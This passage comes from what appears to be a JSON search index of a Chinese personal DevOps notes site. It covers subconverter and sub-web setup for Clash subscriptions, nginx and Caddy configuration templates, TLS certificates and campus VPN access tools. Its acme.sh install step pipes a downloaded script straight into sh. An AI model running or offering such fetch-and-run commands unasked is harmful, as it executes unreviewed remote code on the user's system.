\u53ef\u4ee5\u4fee\u6539\u670d\u52a1\u7aef\u53e3\n</code></pre> <p>\u7136\u540e\u9700\u8981\u5f00\u4e00\u4e2a systemd \u670d\u52a1\uff0c<code>/etc/systemd/system/subconverter.service</code>\uff1a</p> <pre><code>[Unit]\nDescription=Subscription Convert API\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/path/to/base/subconverter\nWorkingDirectory=/path/to/base\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>systemctl \u542f\u52a8\u8fd9\u4e2a\u670d\u52a1\u4e4b\u540e\u5c31\u53ef\u4ee5\u5728\u5bf9\u5e94\u7aef\u53e3\u4e0a\u4f7f\u7528\u4e86\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5229\u7528 nginx \u6216 caddy \u53cd\u4ee3\u51fa\u53bb\u3002</p>"},{"location":"devops/network/clash/#zju-rule","title":"ZJU-Rule","text":"<p>ZJU \u53ef\u4ee5\u4f7f\u7528  SubConv/ZJU-Rule \u6765\u57fa\u4e8e ACL4SSR \u6dfb\u52a0 ZJU \u76f8\u5173\u7684\u5206\u6d41\u89c4\u5219\uff0c\u9700\u8981\u5c06\u5176 clone \u5230 <code>/path/to/base</code> \u91cc\u3002</p> <p>\u672c\u5730\u4f7f\u7528\u7684\u8bdd\u9700\u8981\u5c06 <code>ZJU-Rule/Clash/config/ZJU.ini</code> \u91cc\u7684 <code>https://raw.githubusercontent.com/SubConv/ZJU-Rule/main/</code> \u90fd\u6539\u6210 <code>ZJU-Rule/</code>\uff0c\u5426\u5219\u6bcf\u6b21\u90fd\u4f1a\u4ece\u8fdc\u7a0b\u62c9\u89c4\u5219\u3002</p> <p>\u7136\u540e\u5728 base \u91cc\u7684 <code>pref.ini</code> \u91cc\u52a0\u4e0a\uff1a</p> <pre><code>[common]\ndefault_external_config=ZJU-Rule/Clash/config/ZJU.ini\n</code></pre> <p>\u8fd9\u6837\u9ed8\u8ba4\u4f7f\u7528\u7684\u5c31\u662f\u672c\u5730\u7684 ZJU-Rule \u4e86\u3002\u6240\u6709\u89c4\u5219\u7684\u5165\u53e3\u90fd\u5728\u8fd9\u4e2a <code>ZJU.ini</code> \u91cc\uff0c\u60f3\u52a0\u81ea\u5df1\u7684\u89c4\u5219\u7684\u8bdd\u53ef\u4ee5\u4ece\u8fd9\u91cc\u5165\u624b\uff0c\u5728\u5bf9\u5e94\u7684 .list \u6587\u4ef6\u91cc\u6dfb\u52a0\u3002</p>"},{"location":"devops/network/clash/#sub-web","title":"sub-web","text":"<p>\u524d\u7aef\u4f7f\u7528  CareyWang/sub-web\uff0c\u8fd9\u4e2a\u7f51\u7ad9\u7684\u4e3b\u8981\u7528\u9014\u5c31\u662f\u8f85\u52a9\u914d\u7f6e\u751f\u6210\u4f7f\u7528 subconverter \u7684\u65b0\u8ba2\u9605\u94fe\u63a5\u3002</p> <p>\u7528 docker \u642d\u5efa\u5c31\u597d\uff0c\u5b98\u65b9\u955c\u50cf\u662f <code>careywong/subweb:latest</code>\uff0c\u5982\u679c\u9700\u8981\u4fee\u6539\u7f51\u7ad9\u5185\u5bb9\u7684\u8bdd\u9700\u8981\u81ea\u5df1 build\uff0cdocker-compose \u5982\u4e0b\uff1a</p> <pre><code>name: subweb-docker\n\nservices:\n    subweb:\n        build: sub-web  # \u6e90\u7801\u6587\u4ef6\u5939\n        container_name: subweb\n        restart: always\n        ports:\n            - '&lt;port&gt;:80'\n</code></pre> <p>\u57fa\u672c\u4e0a\u9700\u8981\u4fee\u6539\u7684\u5c31\u662f <code>src/views/Subconverter.vue</code> \u8fd9\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u7528\u4e86\u6211\u52a0\u4e86 token \u7684\u540e\u7aef\u7684\u8bdd\uff0c\u9700\u8981\u5728\u8fd9\u91cc\u52a0\u4e0a\u4e00\u4e2a form \u7528\u4e86\u586b token\uff0c\u53ef\u4ee5\u8bb0\u5f55\u503c\u4e3a <code>form.token</code>\uff0c\u7136\u540e\u5728 makeUrl \u51fd\u6570\u91cc\u7c7b\u4f3c\u4f4d\u7f6e\u6dfb\u52a0\uff1a</p> <pre><code>if (this.form.token !== \"\") {\n    this.customSubUrl +=\n        \"&amp;token=\" + encodeURIComponent(this.form.token);\n}\n</code></pre> <p>\u53e6\u5916\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u9700\u8981\u66f4\u6539\u7684\u662f remoteConfig \u914d\u7f6e\uff0c\u6211\u7684\u914d\u7f6e\u6dfb\u52a0\u4e86\uff1a</p> <pre><code>remoteConfig: [{\n    label: \"ZJU-Rule\",\n    options: [{\n        label: \"\u672c\u5730 ZJU-Rule\uff08\u9ed8\u8ba4\u3001\u7a33\u5b9a\uff0c\u5e26 TonyCrane \u57df\u540d\u89c4\u5219\uff09\",\n        value: \"\"\n    }, {\n        label: \"GitHub ZJU-Rule\uff08\u53ef\u80fd\u51fa\u73b0\u4e0b\u8f7d\u95ee\u9898\uff09\",\n        value:\n        \"https://raw.githubusercontent.com/SubConv/ZJU-Rule/main/Clash/config/ZJU.ini\"\n    }]\n}, ...\n</code></pre> <p>\u8fd9\u6837\u89c4\u5219 ini \u662f\u7a7a\u7684\u8bdd\u5c31\u4f1a\u4f7f\u7528\u5230 subconverter \u7684 <code>default_external_config</code> \u4e5f\u5c31\u662f\u6211\u4eec\u4e4b\u524d\u914d\u7f6e\u7684\u672c\u5730 ZJU.ini\u3002\u53e6\u5916\u8fd8\u52a0\u4e86\u4e00\u4e2a\u76f4\u63a5\u62c9\u53d6 GitHub \u4e0a\u7684\u7248\u672c\u7684\u9009\u9879\uff0c\u5176\u4ed6\u89c4\u5219\u5c31\u7531 sub-web \u9ed8\u8ba4\u63d0\u4f9b\u5c31\u591f\u4e86\uff08\u57fa\u672c\u4e0a\u6709 ZJU-Rule \u5c31\u53ea\u7528 ZJU-Rule \u4e86\uff09\u3002</p> <p>\u7136\u540e\u5728\u4f7f\u7528\u7684\u65f6\u5019\u8ba2\u9605\u94fe\u63a5\u4e00\u884c\u4e00\u884c\u7c98\u8d34\uff08\u4e0d\u8981\u6709\u7a7a\u884c\uff09\uff0c\u9009\u62e9\u540e\u7aef\u5730\u5740 <code>http(s)://...:.../sub?</code>\uff0c\u518d\u9009\u62e9\u8fdc\u7a0b\u914d\u7f6e\uff0c\u4e4b\u540e\u751f\u6210\u94fe\u63a5\u5c31\u53ef\u4ee5\u8d34\u5230 clash \u91cc\u7528\u4e86\u3002</p>"},{"location":"devops/network/clash/#_4","title":"\u7279\u6b8a\u8ba2\u9605\u94fe\u63a5","text":"<p>\u524d\u9762\u641e\u597d\u7684 sub-web \u5728\u8d34\u8ba2\u9605\u94fe\u63a5\u7684\u65f6\u5019\u9664\u4e86\u8d34\u673a\u573a\u7684\u94fe\u63a5\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u540c\u65f6\u5e26\u4e00\u4e9b\u81ea\u5df1\u642d\u5efa\u7684\u4ee3\u7406\u670d\u52a1\uff0c\u8fd9\u4e9b\u901a\u8fc7\u7279\u5b9a\u7684 protocol \u5c31\u53ef\u4ee5\u89e3\u6790\u6210\u4e00\u4e2a\u8282\u70b9\u4e86\u3002</p> <ul> <li>socks \u4ee3\u7406\uff0c\u53ef\u4ee5\u4f7f\u7528 tg \u7684 protocol\uff1a      <pre><code>tg://socks?server=&lt;ip&gt;&amp;port=&lt;port&gt;&amp;remarks=&lt;name&gt;\n</code></pre></li> <li>vmess \u4ee3\u7406\uff0c\u901a\u8fc7 vmess protocol\uff1a     <pre><code>vmess://&lt;base64&gt;?remarks=&lt;name&gt;&amp;alterId=...\nvmess://&lt;base64&gt;?remarks=&lt;name&gt;&amp;obfsParam=&lt;host&gt;&amp;path=/&lt;path&gt;/&amp;obfs=websocket&amp;alterId=...\n</code></pre><ul> <li>\u5176\u4e2d base64 \u7f16\u7801\u7684\u662f <code>&lt;cipher&gt;:&lt;uuid&gt;@&lt;host&gt;:&lt;port&gt;</code>\uff0ccipher \u53ef\u4ee5\u7528 auto<ul> <li>\u9700\u8981\u7528 URL Safe \u7684\u5b57\u7b26\u96c6\u8fdb\u884c\u7f16\u7801</li> </ul> </li> <li>\u540e\u8005\u4f1a\u751f\u6210\u4e0b\u9762\u8fd9\u6837\u7684\u8282\u70b9\u4fe1\u606f\uff1a     <pre><code>- name: &lt;name&gt;\n  ...\n  network: ws\n  ws-opts:\n    path: /&lt;path&gt;/\n    headers:\n      Host: &lt;host&gt;\n</code></pre></li> </ul> </li> </ul> <p>\u53e6\u5916\u8fd9\u91cc\u7684 name \u4f1a\u88ab subconverter \u7528\u6765\u5339\u914d\u8282\u70b9\u4fe1\u606f\uff0c\u6bd4\u5982\u5176\u4e2d\u5e26\u201c\u65e5\u672c\u201d\u201c\u4e1c\u4eac\u201d\u5b57\u6837\u5219\u4f1a\u5212\u5206\u5230\u65e5\u672c\u8282\u70b9\u4e00\u7c7b\uff0c\u4f7f\u7528 ZJU-Rule \u5e76\u5e26\u201cZJU\u201d\u5b57\u6837\u5219\u4f1a\u5206\u914d\u5230 ZJU \u5185\u7f51\u4e00\u7c7b\uff08\u5e76\u4e14\u4e0d\u4f1a\u88ab\u81ea\u52a8\u5207\u6362\u9009\u7528\uff09\u3002</p>"},{"location":"devops/network/server/","title":"Web \u670d\u52a1\u5668\u76f8\u5173","text":"<p> \u7ea6 1071 \u4e2a\u5b57  168 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u5173\u4e8e nginx\u3001caddy \u548c\u5176\u4ed6\u76f8\u5173\u5de5\u5177\u7684\u4f7f\u7528\u8bb0\u5f55\u3002</p>"},{"location":"devops/network/server/#nginx","title":"Nginx","text":"<p>\u76ee\u524d\u5728\u516c\u7f51\u670d\u52a1\u5668\u4e0a\u6211\u8fd8\u5728\u4f7f\u7528 nginx\uff0c\u6839\u914d\u7f6e\u6587\u4ef6\u5728 <code>/etc/nginx/nginx.conf</code>\uff0c\u6574\u4f53\u903b\u8f91\u662f\uff1a</p> <pre><code>...\n\nhttp {\n    server {\n        listen 80;\n        listen 443 ssl http2;\n        server_name ...;\n        index ...;\n        root ...;\n    }\n\n    server {\n        ...\n    }\n\n    ...\n}\n</code></pre> <p>\u6211\u4e60\u60ef\u662f\u628a\u6240\u6709\u7f51\u7ad9\u7684\u914d\u7f6e\u90fd\u653e\u5728\u4e00\u4e2a\u6587\u4ef6\u5939\u91cc\uff0c\u7136\u540e\u5168\u5c40 nginx.conf \u91cc\u7684 http \u53ea\u7559\u4e00\u4e9b\u57fa\u672c\u914d\u7f6e\uff0c\u7136\u540e include \u4e00\u4e2a <code>site-list.conf</code> \u6587\u4ef6\uff0c\u91cc\u9762\u518d\u653e\u4e00\u5806 include \u5206\u522b\u5f15\u5165\u6bcf\u4e2a\u7f51\u7ad9\u7684\u914d\u7f6e\u6587\u4ef6\u3002</p>"},{"location":"devops/network/server/#http","title":"http \u88f8\u670d\u52a1\u6a21\u677f","text":"<p>\u4e00\u822c\u662f\u5728\u51c6\u5907\u7b2c\u4e00\u6b21\u7533\u8bf7\u8bc1\u4e66\u7684\u65f6\u5019\u7528\u7684\uff1a</p> <pre><code>server {\n    listen 80;\n    server_name ...;\n    index index.html;\n    root /websites/.../wwwroot;\n    location /.well-known/ {\n        allow all;\n    }\n}\n</code></pre>"},{"location":"devops/network/server/#https","title":"\u9759\u6001 https \u670d\u52a1\u6a21\u677f","text":"<pre><code>server {\n    listen 80;\n    listen 443 ssl http2;\n    server_name ...;\n    index index.html;\n    root /websites/.../wwwroot;\n\n    if ($server_port !~ 443) {\n        rewrite ^(/.*)$ https://$host$1 permanent;\n    }\n\n    ssl_certificate /websites/.../cert/fullchain.pem;\n    ssl_certificate_key /websites/.../cert/key.pem;\n    ssl_protocols TLSv1.1 TLSv1.2;\n    ssl_session_cache shared:SSL:10m;\n    ssl_session_timeout 10m;\n\n    add_header Strict-Transport-Security \"max-age=31536000\";\n    error_page 497 https://$host$request_uri;\n\n    location /.well-known/ {\n        allow all;\n    }\n\n    access_log /websites/logs/....log;\n    error_log /websites/logs/....error.log;\n}\n</code></pre>"},{"location":"devops/network/server/#_1","title":"\u53cd\u4ee3\u670d\u52a1\u6a21\u677f","text":"<pre><code>location ^~ / {\n    proxy_pass localhost:...;\n    proxy_set_header Host $host;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header REMOTE-HOST $remote_addr;\n    add_header X-Cache $upstream_cache_status;\n}\n\nlocation /.well-known/ {    # \u9700\u8981\u4fdd\u7559\u8fd9\u4e2a\uff0c\u7528\u4e8e acme.sh \u81ea\u52a8\u7eed\u7b7e\n    allow all;\n}\n</code></pre>"},{"location":"devops/network/server/#_2","title":"\u8df3\u8f6c\u670d\u52a1\u6a21\u677f","text":"<pre><code>location ^~ / {\n    rewrite ^/.* &lt;url&gt; permanent;\n}\n\nlocation /.well-known/ {\n    allow all;\n}\n\naccess_log off;\n</code></pre> <ul> <li>permanent \u662f\u6c38\u4e45\u91cd\u5b9a\u5411\uff0c\u72b6\u6001\u7801 301<ul> <li>\u8868\u793a\u5df2\u7ecf\u6c38\u4e45\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e\uff0c\u6240\u6709\u5bf9\u539f\u59cb url \u7684\u8bf7\u6c42\u3001\u641c\u7d22\u5f15\u64ce\u7684\u6743\u91cd\u7b49\u90fd\u4f1a\u8f6c\u79fb\u5230\u65b0\u7684 url \u4e0a</li> <li>\u4e00\u822c\u4f5c\u4e3a\u77ed\u94fe\u8df3\u8f6c\u3001\u4e0d\u66f4\u6539\u76ee\u7684\u5730\u5740\u7684\u60c5\u51b5\u4e0b\u7528 301 \u5373\u53ef</li> </ul> </li> <li>redirect \u662f\u4e34\u65f6\u91cd\u5b9a\u5411\uff0c\u72b6\u6001\u7801 302<ul> <li>\u4e0d\u4fdd\u8bc1\u4ee5\u540e\u4f1a\u4e0d\u4f1a\u6539\u76ee\u7684\u5730\u5740\uff0c\u636e\u8bf4\u4e0d\u63a8\u8350\u4f7f\u7528</li> </ul> </li> </ul>"},{"location":"devops/network/server/#location","title":"\u591a\u4e2a location \u5339\u914d\u987a\u5e8f","text":"<p>\u4e00\u4e2a server \u91cc\u53ef\u4ee5\u6709\u591a\u4e2a location \u89c4\u5219\uff0c\u5206\u522b\u53ef\u4ee5\u5199\uff1a</p> <ul> <li>\u7cbe\u786e\u5339\u914d\uff1a<ul> <li>location = /uri</li> </ul> </li> <li>\u524d\u7f00\u5339\u914d\uff1a<ul> <li>location /uri</li> <li>location ^~ /uri</li> </ul> </li> <li>\u6b63\u5219\u5339\u914d\uff1a<ul> <li>location ~ /uri\uff1a\u533a\u5206\u5927\u5c0f\u5199</li> <li>location ~* /uri\uff1a\u4e0d\u533a\u5206\u5927\u5c0f\u5199</li> <li>location !~ /uri\uff1a\u533a\u5206\u5927\u5c0f\u5199\uff0c\u4e0d\u5339\u914d</li> </ul> </li> <li>\u901a\u7528\u5339\u914d\uff1a<ul> <li>location /\uff1a\u5339\u914d\u6240\u6709\u8bf7\u6c42</li> </ul> </li> </ul> <p>\u987a\u5e8f\u662f\uff1a</p> <ul> <li>\u7cbe\u786e\u5339\u914d\u4f18\u5148\u7ea7\u6700\u9ad8</li> <li>\u67e5\u627e\u6709\u6ca1\u6709\u5b8c\u5168\u6ee1\u8db3\u524d\u7f00\u5339\u914d</li> <li>\u5339\u914d\u6240\u6709 ^~ \u7684 location\uff0c\u627e\u5230\u6700\u957f\u7684\u4e00\u4e2a\uff08\u548c\u58f0\u660e\u987a\u5e8f\u65e0\u5173\uff09<ul> <li>\u5982\u679c\u627e\u5f97\u5230\uff1a\u8df3\u8fc7\u6b63\u5219\u5339\u914d\uff0c\u8fdb\u884c\u5176\u4ed6\u7684\u524d\u7f00\u5339\u914d</li> <li>\u5982\u679c\u627e\u4e0d\u5230\uff0c\u63a5\u4e0b\u53bb</li> </ul> </li> <li>\u8fdb\u884c\u6b63\u5219\u5339\u914d\uff0c\u6309\u7167\u914d\u7f6e\u4e2d\u7684\u987a\u5e8f\u4f9d\u6b21\u5339\u914d<ul> <li>\u6709\u5339\u914d\u6210\u529f\uff1a\u7acb\u5373\u505c\u6b62\uff0c\u4f7f\u7528\u8fd9\u4e2a location\uff0c\u4e0d\u5339\u914d\u5176\u4ed6\u6b63\u5219</li> <li>\u6ca1\u5339\u914d\u6210\u529f\uff0c\u5339\u914d\u4e0b\u4e00\u4e2a\uff0c\u5982\u679c\u90fd\u5339\u914d\u4e0d\u4e0a\uff0c\u63a5\u4e0b\u53bb</li> </ul> </li> <li>\u8fdb\u884c\u5176\u4ed6\u4e0d\u5e26\u4fee\u9970\u7684\u524d\u7f00\u5339\u914d<ul> <li>\u548c\u5e26 ^~ \u7684\u4e00\u6837\uff0c\u627e\u5230\u6574\u4f53\u6700\u957f\u7684\u4e00\u4e2a</li> </ul> </li> <li>\u5982\u679c\u8fd8\u662f\u6ca1\u6709\u5339\u914d\uff0c\u4f7f\u7528\u901a\u7528\u5339\u914d</li> </ul> <p>\u53ef\u4ee5\u7528\u5de5\u5177  detailyang/nginx-location-match-visible \u6765\u6d4b\u8bd5\u5339\u914d\u60c5\u51b5\u3002</p>"},{"location":"devops/network/server/#acmesh","title":"acme.sh","text":"<p>Nginx \u4e0a\u914d\u7f6e SSL \u8bc1\u4e66\u53ef\u4ee5\u7528 acme.sh \u6765\u81ea\u52a8\u5b8c\u6210\uff1a</p> <ul> <li>\u5b89\u88c5 acme.sh\uff1a     <pre><code>curl https://get.acme.sh | sh -s email=my@example.com\n</code></pre></li> <li>\u7533\u8bf7\u8bc1\u4e66\uff1a     <pre><code>acme.sh --issue -d domain.example.com --webroot /path/to/wwwroot\n</code></pre></li> <li>\u5b89\u88c5\u8bc1\u4e66\uff1a     <pre><code>acme.sh --install-cert -d domain.example.com \\\n    --key-file /path/to/cert/key.pem \\\n    --fullchain-file /path/to/cert/fullchain.pem \\\n    --reloadcmd \"sudo service nginx force-reload\"\n</code></pre><ul> <li>\u4e4b\u540e acme \u4f1a\u5b9a\u671f\u81ea\u52a8\u7eed\u7b7e\uff0c\u5e76\u66f4\u65b0\u4e24\u4e2a pem \u6587\u4ef6\uff0c\u518d\u81ea\u52a8\u6267\u884c reload \u6307\u4ee4</li> </ul> </li> </ul>"},{"location":"devops/network/server/#caddy","title":"Caddy","text":"<p>Caddy \u662f\u4e00\u4e2a\u66f4\u4fbf\u4e8e\u4f7f\u7528\u3001\u6548\u7387\u66f4\u9ad8\u7684 web \u670d\u52a1\u5668\uff0c\u6211\u5728\u65b0\u914d\u7f6e\u7684\u5185\u7f51\u670d\u52a1\u5668\u4e0a\u8f6c\u7528\u4e86 caddy\u3002\u901a\u8fc7 apt \u5b89\u88c5\u4f1a\u9ed8\u8ba4\u5f00\u542f\u4e00\u4e2a systemd \u670d\u52a1\uff0c\u8fd0\u884c\u914d\u7f6e <code>/etc/caddy/Caddyfile</code>\uff1a</p> <pre><code>sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl\ncurl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg\ncurl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list\nsudo apt update\nsudo apt install caddy\n</code></pre> <p>\u7528\u8d77\u6765\u7684\u8bdd caddy \u7684\u914d\u7f6e\u5c11\u5f97\u591a\uff0c\u6240\u4ee5\u76f4\u63a5\u5728 <code>/etc/caddy/Caddyfile</code> \u4e00\u4e2a\u6587\u4ef6\u91cc\u5199\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd0\u884c\u524d\u53ef\u4ee5\u5148 fmt \u4e00\u4e0b\uff1a</p> <pre><code>cd /etc/caddy\ncaddy fmt --overwrite\n</code></pre> <p>\u7136\u540e\u91cd\u65b0\u8f7d\u5165 caddy \u5c31\u53ef\u4ee5\u66f4\u65b0\u914d\u7f6e\u4e86\uff1a</p> <pre><code>systemctl reload caddy\n</code></pre> <p>Caddyfile \u7684\u683c\u5f0f\u5927\u4f53\u4e0a\u662f\uff1a</p> <pre><code>{\n    email ...   # \u5168\u5c40\u914d\u7f6e\n}\n\n(snippet) {\n    ...\n}\n\nsite_addr1 site_addr2 {\n    @post {     # \u5b9a\u4e49\u4e00\u4e2a matcher\n        method POST\n    }\n    reverse_proxy @post localhost:... {  # \u4f7f\u7528 matcher\n        ...     # \u989d\u5916\u914d\u7f6e\n    }\n    file_server /static     # \u9759\u6001\u6587\u4ef6\u670d\u52a1\n    import snippet\n}\n\nsite_addr3 {\n    redir https://...{uri}\n}\n\nsite_addr4 {\n    reverse_proxy localhost:...     # \u53cd\u4ee3\u8fd9\u6837\u4e00\u53e5\u5c31\u591f\u4e86\n}   \n</code></pre>"},{"location":"devops/network/server/#tls","title":"TLS \u8bc1\u4e66","text":"<p>Caddy \u4f1a\u81ea\u52a8\u4e3a\u670d\u52a1\u7533\u8bf7\u8bc1\u4e66\uff0c\u9700\u8981\u5168\u5c40\u914d\u7f6e\u4e00\u4e0b email\uff0c\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u5c31\u4f1a\u901a\u8fc7\u516c\u5171\u7684 ACME CA \u6765\u8fdb\u884c\u7533\u8bf7\uff0c\u5e76\u5c06 HTTP \u670d\u52a1\u81ea\u52a8\u91cd\u5b9a\u5411\u5230 HTTPS \u670d\u52a1\u3002\uff08\u6211\u76ee\u524d\u53ea\u5728\u5185\u7f51\u670d\u52a1\u5668\u4e0a\u7528\u4e86 caddy\uff0c\u6240\u4ee5\u4e0d\u4f1a\u6d89\u53ca\u5230\u516c\u7f51\u8bc1\u4e66\u7684\u95ee\u9898\uff0c\u8fd8\u6ca1\u8bd5\u8fc7\uff09</p> <p>\u517c\u5bb9 HTTP \u7684\u8bdd\u9700\u8981\u5355\u72ec\u914d\u7f6e\u65b0\u7684 site\uff1a</p> <pre><code>http://site_addr {\n    reverse_proxy ...\n    ...\n}\n</code></pre>"},{"location":"devops/network/server/#_3","title":"\u5185\u7f51\u8bc1\u4e66","text":"<p>\u5728 site block \u91cc\u9762 <code>tls internal</code> \u5c31\u53ef\u4ee5\u4f7f\u7528\u5185\u90e8\u6839\u8bc1\u4e66\u7b7e\u53d1\u7684\u8bc1\u4e66\u4e86\uff0c\u4f46\u8bc1\u4e66\u9700\u8981\u5728\u8bbf\u95ee\u7684\u8bbe\u5907\u4e0a\u624b\u52a8\u4fe1\u4efb\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6839\u8bc1\u4e66\u6709\u6548\u671f 10 \u5e74\uff0c\u4e2d\u95f4\u8bc1\u4e66\u6709\u6548\u671f\u4e03\u5929\uff0c\u7f51\u7ad9\u8bc1\u4e66\u6709\u6548\u671f 12 \u4e2a\u5c0f\u65f6\uff0c\u8fd9\u4e2a\u65f6\u95f4\u90fd\u592a\u77ed\u4e86\uff0c\u53ef\u4ee5\u914d\u7f6e\uff1a</p> <pre><code>{\n    pki {\n        ca local {\n            intermediate_lifetime 90d\n        }\n    }\n}\n\nsite_addr {\n    tls {\n        on_demand   # \u5185\u7f51\u53ef\u4ee5 on_demand \u6309\u9700\u7b7e\u53d1\n        issuer internal {\n            lifetime 30d\n        }\n    }\n\n    ...\n}\n</code></pre> <p>\u6839\u8bc1\u4e66\u5728 <code>/var/lib/caddy/.local/share/caddy/pki/authorities/local</code> \u76ee\u5f55\u4e0b\uff0c\u662f root.crt \u6587\u4ef6\uff0c\u62f7\u8d1d\u51fa\u6765\u4e4b\u540e\u5728\u8bbf\u95ee\u7684\u8bbe\u5907\u4e0a\u4fe1\u4efb\u5373\u53ef\u3002</p>"},{"location":"devops/network/server/#_4","title":"\u6cdb\u57df\u540d\u89e3\u6790","text":"<p>\u53ea\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u6cdb\u57df\u540d\u7684 DNS\uff0c\u7136\u540e caddy \u53ef\u4ee5\u901a\u8fc7 host matcher \u6765\u6839\u636e\u4e0d\u540c\u57df\u540d\u6765\u914d\u7f6e\u4e0d\u540c\u7684\u670d\u52a1\u3002</p> <pre><code>*.example.com example.com {\n    tls {\n        on_demand\n        issuer internal\n    }\n\n    @root host example.com\n    handle @root {\n        ...\n    }\n\n    @sub host sub.example.com\n    handle @sub {\n        ...\n    }\n\n    ...\n\n    handle {\n        abort\n    }\n}\n</code></pre>"},{"location":"devops/network/server/#_5","title":"\u63d2\u4ef6\u5b89\u88c5","text":"<p>caddy \u53ef\u4ee5\u901a\u8fc7 xcaddy \u5de5\u5177\u6765\u5b89\u88c5\u63d2\u4ef6\uff0c\u4e0d\u8fc7\u903b\u8f91\u662f\u5c06\u63d2\u4ef6\u7f16\u8bd1\u8fdb caddy \u7684\u4e8c\u8fdb\u5236\u4e2d\uff0c\u5373\u76f8\u5f53\u4e8e\u91cd\u65b0\u7f16\u8bd1 caddy\u3002\u901a\u8fc7 go \u5b89\u88c5 xcaddy\uff1a</p> <pre><code>go install github.com/caddyserver/xcaddy/cmd/xcaddy@latest\n</code></pre> <p>\u901a\u8fc7 xcaddy \u9644\u5e26\u63d2\u4ef6\u6784\u5efa caddy\uff1a</p> <pre><code>xcaddy build --with github.com/sjtug/caddy2-filter\n</code></pre> <p>\u6784\u5efa\u540e\u9700\u8981\u7528 ./caddy \u624b\u52a8\u66ff\u6362\u6389 /usr/bin/caddy\uff0c\u6216\u66f4\u6539 caddy.service\u3002</p>"},{"location":"devops/network/server/#_6","title":"\u4e00\u4e9b\u6742\u9879","text":"<ul> <li>handle \u548c handle_path \u7684\u533a\u522b\uff1a<ul> <li>handle_path \u5728 handle \u7684\u57fa\u7840\u4e0a\u81ea\u52a8\u5e94\u7528 uri strip_prefix     <pre><code>handle_path /prefix/* {\n    ...\n}\n# \u7b49\u4ef7\u4e8e\nhandle /prefix/* {\n    uri strip_prefix /prefix\n    ...\n}\n</code></pre></li> <li>handle_path \u4e0d\u80fd\u7528 named matcher\uff08\u5373 @...\uff09\uff0c\u53ea\u80fd\u7528 path matcher</li> </ul> </li> </ul>"},{"location":"devops/network/tunnel/","title":"\u5185\u7f51\u7a7f\u900f\u4e0e\u4ee3\u7406","text":"<p> \u7ea6 2364 \u4e2a\u5b57  265 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u91cc\u662f\u4e00\u4e9b\u6821\u5916\u8bbf\u95ee\u6821\u5185\u7f51\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5185\u7f51\u7a7f\u900f\u7684\u65b9\u6cd5\u3002</p> <p>\u6709\u53c2\u8003\uff1a</p> <ul> <li>\u5e94\u7528\u7bc7 \u53cd\u5411\u4ee3\u7406 2 - \u65b0 V2Ray \u767d\u8bdd\u6587\u6307\u5357</li> </ul>"},{"location":"devops/network/tunnel/#zju-connect","title":"ZJU Connect","text":"<p>\u6700\u65b9\u4fbf\u7684\u672c\u5730\u8bbf\u95ee\u6821\u5185\u7f51\u7684\u65b9\u5f0f\u662f\u4f7f\u7528  Mythologyli/zju-connect\uff0c\u5b83\u57fa\u4e8e EasierConnect\uff0c\u53ef\u4ee5\u5b8c\u5168\u53d6\u4ee3 EasyConnect\u3002\u53ef\u4ee5\u901a\u8fc7 docker \u5f88\u65b9\u4fbf\u5730\u90e8\u7f72\uff1a</p> <pre><code>services:\n  zju-connect:\n    image: mythologyli/zju-connect\n    container_name: zju-connect\n    restart: unless-stopped\n    ports:\n      - 1080:1080\n      - 1081:1081\n    volumes:\n      - ./config.toml:/home/nonroot/config.toml\n</code></pre> <p>\u5176\u4e2d config.toml \u6839\u636e repo \u91cc\u7684 config.toml.example \u4fee\u6539\u5373\u53ef\u3002\u5f00\u542f\u540e\u914d\u5408 ZJU-Rule \u4f7f\u7528\u53ef\u4ee5\u76f4\u63a5\u5728\u8ba2\u9605\u94fe\u63a5\u7684\u5730\u65b9\u52a0\u4e0a\u4e00\u6761 <code>tg://socks?server=127.0.0.1&amp;port=1080&amp;remarks=ZJU RVPN</code>\uff0c\u8be6\u89c1 Clash \u4ee3\u7406\u914d\u7f6e\u3002</p> <p>\u4e0d\u8fc7\u56e0\u4e3a\u5b83\u8d70\u7684\u662f RVPN\uff0c\u6240\u4ee5\u540c\u4e00\u65f6\u523b\u53ea\u80fd\u6709\u4e00\u4e2a\u8fde\u63a5\uff0c\u4e0d\u80fd\u5728\u591a\u4e2a\u8bbe\u5907\u4e0a\u540c\u65f6\u4f7f\u7528\u3002</p>"},{"location":"devops/network/tunnel/#zju-atrust","title":"ZJU aTrust","text":"<p>about aTrust</p> <p>\u81ea 25 \u5e74 5 \u6708\u5f00\u59cb\uff0c\u539f\u6765\u7684 RVPN (ZJU Connect) \u7981\u7528\u4e86\u5927\u91cf\u7aef\u53e3\uff0c\u63a8\u8350\u7684 VPN \u670d\u52a1\u66f4\u65b0\u5230\u4e86\u6df1\u4fe1\u670d\u7684\u53e6\u4e00\u4e2a\u8f6f\u4ef6 aTrust \u4e0a\uff0c\u5730\u5740\u4e3a https://vpn.zju.edu.cn\u3002\u8fde\u63a5\u540e\u4f1a\u4fee\u6539 route \u8868\uff0c\u5bf9\u9700\u8981\u5185\u7f51\u7684\u5730\u5740\u8f6c\u53d1\u5230 atrust \u7684 utun \u63a5\u53e3\u4e0a\u3002</p> <p>\u4f46 